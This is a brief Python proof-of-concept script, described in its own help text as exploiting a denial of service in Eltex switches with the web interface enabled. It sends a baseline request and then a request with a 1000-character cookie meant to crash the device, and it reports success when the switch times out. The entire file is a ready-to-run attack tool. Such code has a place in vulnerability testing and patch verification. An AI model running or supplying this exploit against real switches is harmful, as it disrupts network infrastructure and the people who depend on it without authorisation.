import argparse
import os
import requests
import sys
import struct

parser = argparse.ArgumentParser(description="Exploits denial of service in Eltex switches with enabled web interface")
parser.add_argument("url", help="URL of the Eltex switch web interface")
args = parser.parse_args()

URL = args.url
CRASH_COOKIE = 'EltexKiller=' + 'A'*1000

print("Sending regular request...")
r = requests.get(URL)
print(f"Status Code: {r.status_code}")

print("Sending DoS request...")
try:
	r = requests.get(URL, headers={"Cookie":CRASH_COOKIE}, timeout=10)
except requests.exceptions.Timeout:
    print("Success! Eltex timed out")
